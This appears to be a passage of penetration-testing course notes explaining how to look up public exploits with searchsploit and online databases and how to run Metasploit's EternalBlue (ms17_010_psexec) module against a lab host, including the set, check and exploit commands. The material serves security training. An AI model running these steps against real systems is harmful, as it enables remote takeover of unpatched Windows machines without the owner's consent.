Once we identify the services running on ports identified from our `Nmap` scan, the first step is to look if any of the applications/services have any public exploits. Public exploits can be found for web applications and other applications running on open ports, like `SSH` or `ftp`.

# Finding Public Exploits

Many tools can help us search for public exploits for the various applications and services we may encounter during the enumeration phase. One way is to Google for the application name with `exploit` to see if we get any results:

A well-known tool for this purpose is `searchsploit`, which we can use to search for public vulnerabilities/exploits for any application. We can install it with the following command:

```bash
sudo apt install exploitdb -y
```

Then, we can use `searchsploit` to search for a specific application by its name, as follows:

```bash
searchsploit openssh 7.2
```

![[Pasted image 20220905162154.png]]
We can also utilize online exploit databases to search for vulnerabilities, like [Exploit DB](https://www.exploit-db.com), [Rapid7 DB](https://www.rapid7.com/db/), or [Vulnerability Lab](https://www.vulnerability-lab.com).

# Metasploit Primer

The Metasploit Framework (MSF) is an excellent tool for pentesters. It contains many built-in exploits for many public vulnerabilities and provides an easy way to use these exploits against vulnerable targets. MSF has many other features, like:

-   Running reconnaissance scripts to enumerate remote hosts and compromised targets
    
-   Verification scripts to test the existence of a vulnerability without actually compromising the target
    
-   Meterpreter, which is a great tool to connect to shells and run commands on the compromised targets
    
-   Many post-exploitation and pivoting tools
    

Let us take a basic example of searching for an exploit for an application we are attacking and how to exploit it. To run `Metasploit`, we can use the `msfconsole` command:

```bash
msfconsole
```

Once we have `Metasploit` running, we can search for our target application with the `search exploit` command. For example, we can search for the SMB vulnerability we identified previously:

```bash
search exploit eternalblue
```

![[Pasted image 20220905162254.png]]

We found one exploit for this service. We can use it by copying the full name of it and using `USE` to use it, we can also use the number (0 in this case).

Before we can run the exploit, we need to configure its options. To view the options available to configure, we can use the `show options` command:

```bash
show options
```

![[Pasted image 20220905162354.png]]
Any option with `Required` set to `yes` needs to be set for the exploit to work. In this case, we only have to options to set: `RHOSTS`, which means the IP of our target (this can be one IP, multiple IPs, or a file containing a list of IPs). We can set them with the `set` command:

```bash
msf6 exploit(windows/smb/ms17_010_psexec) > set RHOSTS 10.10.10.40
RHOSTS => 10.10.10.40
msf6 exploit(windows/smb/ms17_010_psexec) > set LHOST tun0
LHOST => tun0
```

Once we have both options set, we can start the exploitation. However, before we run the script, we can run a check to ensure the server is vulnerable:

```bash
msf6 exploit(windows/smb/ms17_010_psexec) > check
```

Finally, we can use the `run` or `exploit` command to run the exploit:

```bash
msf6 exploit(windows/smb/ms17_010_psexec) > exploit
```